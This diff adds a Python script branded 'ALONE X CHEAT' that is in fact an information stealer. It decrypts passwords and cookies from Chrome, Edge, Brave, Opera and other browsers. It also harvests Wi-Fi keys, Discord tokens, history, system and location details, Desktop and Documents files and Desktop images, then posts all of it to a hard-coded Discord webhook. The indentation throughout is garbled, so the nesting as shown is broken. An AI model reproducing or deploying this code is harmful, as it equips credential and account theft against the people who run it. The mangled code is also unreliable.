@@ -1,0 +1,495 @@
+import os, json, sqlite3, glob, platform, getpass, socket, base64, shutil, tempfile, subprocess, time, traceback, urllib.request
+from datetime import datetime
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1569704503173976095/WHxo53wEBs1w3-RQA44p5ociZ9H6Zte9Y891Driclis4I0vEU2YoYcEtOFIwxKtDKHPf"
+TOOL_NAME = "ALONE X CHEAT"
+VERSION = "1.0.0"
+MAX_FILE_SIZE_MB = 8
+SEND_IMAGES = True
+MAX_IMAGES = 5
+
+
+def get_temp_dir():
+ path = os.path.join(tempfile.gettempdir(), "ALONE_X_CHEAT")
+ os.makedirs(path, exist_ok=True)
+ return path
+
+
+def safe_read(path, encoding="utf-8", errors="ignore"):
+ try:
+     with open(path, "r", encoding=encoding, errors=errors) as f:
+         return f.read()
+ except Exception:
+     return None
+
+
+def safe_copy(src, dst):
+ try:
+     shutil.copy2(src, dst)
+     return True
+ except Exception:
+     try:
+         with open(src, "rb") as fsrc, open(dst, "wb") as fdst:
+             fdst.write(fsrc.read())
+             return True
+ except Exception:
+     return False
+
+
+def run_cmd(cmd):
+ try:
+     out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=15)
+     return out.decode("utf-8", errors="ignore").strip()
+ except Exception:
+     return ""
+
+
+def get_hwid():
+ try:
+     out = run_cmd("wmic csproduct get uuid")
+     lines = [l.strip() for l in out.splitlines() if l.strip()]
+     if len(lines) >= 2:
+         return lines[1]
+ except Exception:
+     pass
+     return platform.node()
+
+
+def get_public_ip():
+ try:
+     with urllib.request.urlopen("https://api.ipify.org", timeout=8) as r:
+         return r.read().decode()
+ except Exception:
+     return "Unknown"
+
+
+def get_geo_info(ip):
+ try:
+     with urllib.request.urlopen("http://ip-api.com/json/" + ip, timeout=8) as r:
+         return json.loads(r.read().decode())
+ except Exception:
+     return {}
+
+
+def now_str():
+ return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+def file_size_mb(path):
+ try:
+     return os.path.getsize(path) / (1024 * 1024)
+ except Exception:
+     return 0
+
+
+def grab_system_info():
+ info = {
+ "PC Name": platform.node(),
+ "Username": getpass.getuser(),
+ "OS": platform.system() + " " + platform.release(),
+ "Architecture": platform.machine(),
+ "Processor": platform.processor(),
+ "HWID": get_hwid(),
+ "Hostname": socket.gethostname(),
+ "Local IP": socket.gethostbyname(socket.gethostname()),
+ }
+ try:
+     info["Public IP"] = get_public_ip()
+     geo = get_geo_info(info["Public IP"])
+     if geo:
+         info["Country"] = geo.get("country", "?")
+         info["City"] = geo.get("city", "?")
+         info["ISP"] = geo.get("isp", "?")
+ except Exception:
+     pass
+     return info
+
+
+def grab_wifi_passwords():
+ result = {}
+ try:
+     profiles_raw = run_cmd("netsh wlan show profiles")
+     profiles = []
+     for line in profiles_raw.splitlines():
+         if ":" in line and "All User Profile" in line:
+             profiles.append(line.split(":", 1)[1].strip())
+             for p in profiles:
+                 if not p:
+                     continue
+                     detail = run_cmd('netsh wlan show profile name="' + p + '" key=clear')
+                     for line in detail.splitlines():
+                         if "Key Content" in line:
+                             result[p] = line.split(":", 1)[1].strip()
+                             break
+ except Exception:
+     pass
+     return result
+
+
+BROWSER_PATHS = {
+ "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
+ "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
+ "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
+ "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
+ "OperaGX": os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable"),
+ "Vivaldi": os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
+ "Yandex": os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data"),
+}
+
+
+def _decrypt_chromium_password(encrypted, key):
+ try:
+     from Crypto.Cipher import AES
+     iv = encrypted[3:15]
+     payload = encrypted[15:]
+     cipher = AES.new(key, AES.MODE_GCM, iv)
+     decrypted = cipher.decrypt(payload)
+     return decrypted[:-16].decode("utf-8", errors="ignore")
+ except Exception:
+     return None
+
+
+def _get_master_key(local_state_path):
+ try:
+     import win32crypt
+     data = json.loads(safe_read(local_state_path) or "{}")
+     enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
+     enc_key = enc_key[5:]
+     return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
+ except Exception:
+     return None
+
+
+def grab_browser_data():
+ result = {}
+ temp = get_temp_dir()
+ for browser, base in BROWSER_PATHS.items():
+     if not os.path.exists(base):
+         continue
+         result[browser] = {"passwords": [], "cookies": [], "history": []}
+         local_state = os.path.join(base, "Local State")
+         master_key = _get_master_key(local_state) if os.path.exists(local_state) else None
+         profiles = []
+         if os.path.exists(os.path.join(base, "Default")):
+             profiles.append("Default")
+             for p in glob.glob(os.path.join(base, "Profile *")):
+                 profiles.append(os.path.basename(p))
+                 for profile in profiles:
+                     profile_dir = os.path.join(base, profile)
+                     login_db = os.path.join(profile_dir, "Login Data")
+                     if os.path.exists(login_db):
+                         tmp_db = os.path.join(temp, browser + "_" + profile + "_login.db")
+                         if safe_copy(login_db, tmp_db):
+                             try:
+                                 conn = sqlite3.connect(tmp_db)
+                                 cur = conn.cursor()
+                                 cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                                 for url, user, enc_pwd in cur.fetchall():
+                                     if not user:
+                                         continue
+                                         pwd = None
+                                         if enc_pwd:
+                                             if enc_pwd[:3] in (b"v10", b"v11"):
+                                                 if master_key:
+                                                     pwd = _decrypt_chromium_password(enc_pwd, master_key)
+ else:
+     try:
+         import win32crypt
+         pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode("utf-8", errors="ignore")
+ except Exception:
+     pwd = None
+     result[browser]["passwords"].append({"url": url, "username": user, "password": pwd or "N/A", "profile": profile})
+     conn.close()
+ except Exception:
+     pass
+     cookie_db = os.path.join(profile_dir, "Network", "Cookies")
+     if os.path.exists(cookie_db):
+         tmp_db = os.path.join(temp, browser + "_" + profile + "_cookies.db")
+         if safe_copy(cookie_db, tmp_db):
+             try:
+                 conn = sqlite3.connect(tmp_db)
+                 cur = conn.cursor()
+                 cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                 for host, name, enc_val in cur.fetchall():
+                     val = None
+                     if enc_val:
+                         if enc_val[:3] in (b"v10", b"v11") and master_key:
+                             val = _decrypt_chromium_password(enc_val, master_key)
+ else:
+     try:
+         import win32crypt
+         val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode("utf-8", errors="ignore")
+ except Exception:
+     val = None
+     if val:
+         result[browser]["cookies"].append({"host": host, "name": name, "value": val[:200]})
+         conn.close()
+ except Exception:
+     pass
+     hist_db = os.path.join(profile_dir, "History")
+     if os.path.exists(hist_db):
+         tmp_db = os.path.join(temp, browser + "_" + profile + "_hist.db")
+         if safe_copy(hist_db, tmp_db):
+             try:
+                 conn = sqlite3.connect(tmp_db)
+                 cur = conn.cursor()
+                 cur.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                 for url, title, count in cur.fetchall():
+                     result[browser]["history"].append({"url": url, "title": title, "visits": count})
+                     conn.close()
+ except Exception:
+     pass
+     return result
+
+
+def grab_discord():
+ result = {}
+ paths = {
+ "Discord": os.path.expandvars(r"%APPDATA%\discord"),
+ "DiscordPTB": os.path.expandvars(r"%APPDATA%\discordptb"),
+ "DiscordCanary": os.path.expandvars(r"%APPDATA%\discordcanary"),
+ "DiscordDevelopment": os.path.expandvars(r"%APPDATA%\discorddevelopment"),
+ }
+ for name, base in paths.items():
+     if not os.path.exists(base):
+         continue
+         leveldb = os.path.join(base, "Local Storage", "leveldb")
+         if not os.path.exists(leveldb):
+             continue
+             tokens = set()
+             for f in glob.glob(os.path.join(leveldb, "*")):
+                 if not (f.endswith(".ldb") or f.endswith(".log")):
+                     continue
+                     content = safe_read(f, encoding="utf-8", errors="ignore") or ""
+                     for chunk in content.split("dQw4w9WgXcQ:"):
+                         if '"' in chunk:
+                             token = chunk.split('"')[0]
+                             if 20 < len(token) < 100 and "." in token:
+                                 tokens.add(token)
+                                 if tokens:
+                                     result[name] = list(tokens)
+                                     return result
+
+
+def grab_email_clients():
+ result = {}
+ outlook = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Outlook")
+ if os.path.exists(outlook):
+     files = [os.path.basename(f) for f in glob.glob(os.path.join(outlook, "*.ost")) + glob.glob(os.path.join(outlook, "*.pst"))]
+     if files:
+         result["Outlook"] = files
+         tb = os.path.expandvars(r"%APPDATA%\Thunderbird\Profiles")
+         if os.path.exists(tb):
+             result["Thunderbird"] = os.listdir(tb)
+             return result
+
+
+def grab_important_files():
+ result = {}
+ desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+ documents = os.path.join(os.path.expanduser("~"), "Documents")
+ extensions = (".txt", ".json", ".log", ".cfg", ".ini", ".env")
+ for folder_name, folder in [("Desktop", desktop), ("Documents", documents)]:
+     if not os.path.exists(folder):
+         continue
+         result[folder_name] = []
+         try:
+             for f in os.listdir(folder):
+                 full = os.path.join(folder, f)
+                 if os.path.isfile(full) and f.lower().endswith(extensions):
+                     content = safe_read(full)
+                     if content and len(content) < 50000:
+                         result[folder_name].append({"name": f, "content": content[:5000]})
+ except Exception:
+     pass
+     return result
+
+
+def grab_images():
+ images = []
+ desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+ if not os.path.exists(desktop):
+     return images
+     for f in os.listdir(desktop):
+         if f.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp")):
+             images.append(os.path.join(desktop, f))
+             return images
+
+
+def grab_installed_programs():
+ programs = []
+ try:
+     out = run_cmd("wmic product get name,version /format:csv")
+     for line in out.splitlines()[1:]:
+         parts = line.split(",")
+         if len(parts) >= 3 and parts[1].strip():
+             programs.append(parts[1].strip() + " v" + parts[2].strip())
+ except Exception:
+     pass
+     return programs[:80]
+
+
+def grab_all():
+ return {
+ "system": grab_system_info(),
+ "wifi": grab_wifi_passwords(),
+ "browsers": grab_browser_data(),
+ "discord": grab_discord(),
+ "email": grab_email_clients(),
+ "files": grab_important_files(),
+ "programs": grab_installed_programs(),
+ }
+
+
+def _post(payload, files=None):
+ try:
+     if files:
+         r = requests.post(WEBHOOK_URL, data=payload, files=files, timeout=30)
+ else:
+     r = requests.post(WEBHOOK_URL, json=payload, timeout=30)
+     if r.status_code == 429:
+         retry = r.json().get("retry_after", 2)
+         time.sleep(retry / 1000 + 0.5)
+         return _post(payload, files)
+         return r.status_code in (200, 204)
+ except Exception:
+     return False
+
+
+def send_embed(title, description, color=0x00FF00, fields=None):
+ embed = {"title": title, "description": description[:4000], "color": color, "timestamp": now_str(), "footer": {"text": TOOL_NAME + " v" + VERSION}}
+ if fields:
+     embed["fields"] = fields[:25]
+     return _post({"embeds": [embed]})
+
+
+def send_text_as_file(filename, content, message=""):
+ try:
+     files = {"file": (filename, content.encode("utf-8"), "text/plain")}
+     return _post({"content": message[:1900]}, files=files)
+ except Exception:
+     return False
+
+
+def send_image(path, message=""):
+ try:
+     if file_size_mb(path) > MAX_FILE_SIZE_MB:
+         return False
+         with open(path, "rb") as f:
+             files = {"file": (os.path.basename(path), f.read())}
+             return _post({"content": message[:1900]}, files=files)
+ except Exception:
+     return False
+
+
+def send_summary(data):
+ s = data.get("system", {})
+ fields = [
+ {"name": "User", "value": s.get("Username", "?"), "inline": True},
+ {"name": "PC", "value": s.get("PC Name", "?"), "inline": True},
+ {"name": "Country", "value": s.get("Country", "?"), "inline": True},
+ {"name": "IP", "value": s.get("Public IP", "?"), "inline": True},
+ {"name": "OS", "value": s.get("OS", "?")[:100], "inline": False},
+ {"name": "HWID", "value": s.get("HWID", "?")[:100], "inline": False},
+ ]
+ return send_embed(TOOL_NAME + " - Grabbed!", "Time: " + now_str(), 0x00FF00, fields)
+
+
+def send_full_report(data):
+ try:
+     content = json.dumps(data, ensure_ascii=False, indent=2, default=str)
+     return send_text_as_file("ALONE_X_CHEAT_report.json", content, "Full Report")
+ except Exception:
+     return False
+
+
+def send_passwords(data):
+ lines = []
+ for browser, bdata in data.get("browsers", {}).items():
+     pwds = bdata.get("passwords", [])
+     if not pwds:
+         continue
+         lines.append("\n===== " + browser + " (" + str(len(pwds)) + ") =====")
+         for p in pwds:
+             lines.append("URL: " + p["url"] + "\nUser: " + p["username"] + "\nPass: " + p["password"] + "\n")
+             if lines:
+                 send_text_as_file("passwords.txt", "\n".join(lines), "Passwords")
+
+
+def send_wifi(data):
+ wifi = data.get("wifi", {})
+ if not wifi:
+     return
+     lines = [ssid + ": " + pwd for ssid, pwd in wifi.items()]
+     send_text_as_file("wifi.txt", "\n".join(lines), "WiFi")
+
+
+def send_discord_tokens(data):
+ tokens = data.get("discord", {})
+ if not tokens:
+     return
+     lines = []
+     for client, tkns in tokens.items():
+         lines.append("\n===== " + client + " =====")
+         for t in tkns:
+             lines.append(t)
+             send_text_as_file("discord_tokens.txt", "\n".join(lines), "Discord Tokens")
+
+
+def send_cookies(data):
+ lines = []
+ for browser, bdata in data.get("browsers", {}).items():
+     cookies = bdata.get("cookies", [])
+     if not cookies:
+         continue
+         lines.append("\n===== " + browser + " (" + str(len(cookies)) + ") =====")
+         for c in cookies:
+             lines.append(c["host"] + " | " + c["name"] + " = " + c["value"])
+             if lines:
+                 send_text_as_file("cookies.txt", "\n".join(lines), "Cookies")
+
+
+def main():
+ print("=" * 45)
+ print(" " + TOOL_NAME + " v" + VERSION)
+ print("=" * 45)
+ print("[*] Collecting data...")
+ try:
+     data = grab_all()
+ except Exception as e:
+     print("[!] Error: " + str(e))
+     traceback.print_exc()
+     data = {}
+     print("[*] Sending summary...")
+     send_summary(data)
+     time.sleep(1)
+     print("[*] Sending full report...")
+     send_full_report(data)
+     time.sleep(1)
+     print("[*] Sending passwords...")
+     send_passwords(data)
+     time.sleep(1)
+     print("[*] Sending wifi...")
+     send_wifi(data)
+     time.sleep(1)
+     print("[*] Sending discord tokens...")
+     send_discord_tokens(data)
+     time.sleep(1)
+     print("[*] Sending cookies...")
+     send_cookies(data)
+     time.sleep(1)
+     if SEND_IMAGES:
+         print("[*] Sending images...")
+         for img in grab_images()[:MAX_IMAGES]:
+             send_image(img, "Image")
+             time.sleep(1)
+             print("[OK] Done! All data sent to webhook.")
+
+
+if __name__ == "__main__":
+ try:
+     main()
+ except Exception:
+     traceback.print_exc()
+     time.sleep(3)
